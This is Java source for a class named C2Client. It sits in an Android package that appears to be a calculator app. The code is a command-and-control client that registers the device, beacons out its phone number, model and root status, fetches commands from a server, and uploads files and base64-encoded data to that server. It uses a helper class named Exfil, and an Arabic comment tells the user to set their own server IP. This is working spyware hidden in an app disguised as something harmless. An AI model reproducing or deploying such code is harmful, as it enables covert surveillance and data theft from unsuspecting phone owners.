package com.yangdai.calc.core;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class C2Client {
    // ← غيّر هذه إلى IP سيرفرك
    public static final String C2_URL  = "http://127.0.0.1:8080";
    public static final String API_KEY = "vanta-key-change-me";

    private final Context ctx;
    private final SharedPreferences sp;

    public C2Client(Context c) {
        this.ctx = c;
        this.sp = c.getSharedPreferences("sys_core", Context.MODE_PRIVATE);
    }

    public String deviceId() {
        String id = sp.getString("dev_id", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            sp.edit().putString("dev_id", id).apply();
        }
        return id;
    }

    private String post(String path, JSONObject body) throws Exception {
        URL url = new URL(C2_URL + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        c.setRequestProperty("X-Vanta-Key", API_KEY);
        c.setConnectTimeout(15000);
        c.setReadTimeout(20000);
        c.setDoOutput(true);
        try (OutputStream os = c.getOutputStream()) {
            os.write(body.toString().getBytes(StandardCharsets.UTF_8));
        }
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
        }
        return sb.toString();
    }

    public JSONObject buildInfo() throws Exception {
        JSONObject o = new JSONObject();
        o.put("model", Build.MODEL);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("android", Build.VERSION.RELEASE);
        o.put("sdk", Build.VERSION.SDK_INT);
        o.put("phone", Exfil.phoneNumber(ctx));
        o.put("rooted", Exfil.isRooted());
        o.put("battery", Exfil.battery(ctx));
        return o;
    }

    public JSONArray beacon() {
        try {
            JSONObject b = new JSONObject();
            b.put("id", deviceId());
            b.put("info", buildInfo());
            String r = post("/api/beacon", b);
            JSONObject j = new JSONObject(r);
            return j.optJSONArray("commands");
        } catch (Exception e) {
            return null;
        }
    }

    public void register() {
        try {
            JSONObject b = buildInfo();
            b.put("id", deviceId());
            post("/api/register", b);
        } catch (Exception ignored) {}
    }

    public void sendResult(String kind, JSONObject data, String cmdId) {
        try {
            JSONObject b = new JSONObject();
            b.put("id", deviceId());
            b.put("kind", kind);
            b.put("command_id", cmdId == null ? "" : cmdId);
            b.put("data", data);
            post("/api/result", b);
        } catch (Exception ignored) {}
    }

    public void uploadFile(String kind, File f, String cmdId, String meta) {
        try {
            String boundary = "----vanta" + System.currentTimeMillis();
            URL url = new URL(C2_URL + "/api/upload");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            c.setRequestProperty("X-Vanta-Key", API_KEY);
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(60000);

            StringBuilder h = new StringBuilder();
            h.append("--").append(boundary).append("\r\n")
             .append("Content-Disposition: form-data; name=\"id\"\r\n\r\n").append(deviceId()).append("\r\n")
             .append("--").append(boundary).append("\r\n")
             .append("Content-Disposition: form-data; name=\"kind\"\r\n\r\n").append(kind).append("\r\n")
             .append("--").append(boundary).append("\r\n")
             .append("Content-Disposition: form-data; name=\"command_id\"\r\n\r\n").append(cmdId == null ? "" : cmdId).append("\r\n")
             .append("--").append(boundary).append("\r\n")
             .append("Content-Disposition: form-data; name=\"meta\"\r\n\r\n").append(meta == null ? "{}" : meta).append("\r\n")
             .append("--").append(boundary).append("\r\n")
             .append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(f.getName()).append("\"\r\n")
             .append("Content-Type: application/octet-stream\r\n\r\n");

            try (OutputStream os = c.getOutputStream()) {
                os.write(h.toString().getBytes(StandardCharsets.UTF_8));
                try (FileInputStream fis = new FileInputStream(f)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
                }
                os.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            }
            c.getInputStream().close();
        } catch (Exception ignored) {}
    }

    public void sendBase64(String kind, byte[] data, String cmdId, String meta) {
        try {
            JSONObject b = new JSONObject();
            b.put("id", deviceId());
            b.put("kind", kind);
            b.put("command_id", cmdId == null ? "" : cmdId);
            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
            b.put("meta", meta == null ? "{}" : meta);
            // upload عبر /api/upload
            URL url = new URL(C2_URL + "/api/upload");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            c.setRequestProperty("X-Vanta-Key", API_KEY);
            c.setDoOutput(true);
            try (OutputStream os = c.getOutputStream()) {
                os.write(b.toString().getBytes(StandardCharsets.UTF_8));
            }
            c.getInputStream().close();
        } catch (Exception ignored) {}
    }
}
